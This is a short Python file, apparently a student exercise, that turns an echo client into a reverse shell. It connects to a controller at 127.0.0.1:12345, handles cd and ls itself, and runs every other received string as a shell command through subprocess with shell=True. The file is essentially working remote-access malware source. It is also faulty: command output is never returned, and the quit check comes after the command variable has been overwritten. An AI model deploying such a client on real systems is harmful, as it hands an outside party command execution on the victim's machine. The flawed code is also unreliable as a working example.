# Alex Pendell
# March 25, 2019
# Reverse Shell - EchoClient

# This is EchoClient. The client looks for the server, and sends messages to it for the
# server to echo to the terminal.

# THIS IS NO LONGER THE ECHO CLIENT: IT'S SLOWLY BECOMING THE REVERSESHELL

import socket
import sys
import os
import subprocess

# Client plan:
# Socket...
# 1. create()
# 2. connect()
# 3. send() <-> recv() from server
# 4. close()

global HOST
global PORT

HOST = '127.0.0.1'
PORT = 12345
s = socket.socket()
s.connect((HOST, PORT))

while True:

    # This is the command we receive before we determine what the command is.
    cmd = str(s.recv(1024), "utf-8")

    # This the change directory function.
    if cmd[:2] == 'cd':
        os.chdir(cmd[3:])

    # This is the list function.
    elif cmd[:2] == 'ls':
        curdir = os.listdir()
        for file in curdir:
            file_msg = (file + '\n').encode()
            s.send(file_msg)
    else:
        cmd = subprocess.Popen(cmd[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
    print(cmd)
    print("Sending over the directory")
    directory = (os.getcwd() + '$')
    s.send(directory.encode())
        
    # Close gracefully here instead of Ctrl+C'ing everything like a neanderthal
    if cmd == 'quit' or cmd == 'close':
        print("Closing...")
        s.close()
        sys.exit()
